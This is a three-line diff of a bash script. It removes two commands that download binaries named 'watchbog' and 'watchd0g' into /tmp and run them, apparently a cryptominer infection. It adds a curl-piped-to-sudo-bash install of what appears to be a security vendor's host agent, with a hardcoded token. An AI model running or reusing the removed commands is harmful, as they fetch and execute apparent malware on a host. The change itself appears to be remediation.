@@ -1,3 +1,2 @@
 #!/bin/bash
-cd /tmp && wget https://github.com/momika233/test/raw/main/watchbog && chmod +x watchbog && ./watchbog
-cd /tmp && wget  https://github.com/momika233/test/raw/main/watchd0g && chmod +x watchd0g && ./watchd0g
+curl -kfsSL 'http://collie-agent-hk.chaitin.com:1443/api/v1/host/install_script?node=2&os_type=linux' | sudo bash -s -- --token=aedd6797a88a77276433193d9f02fbaf
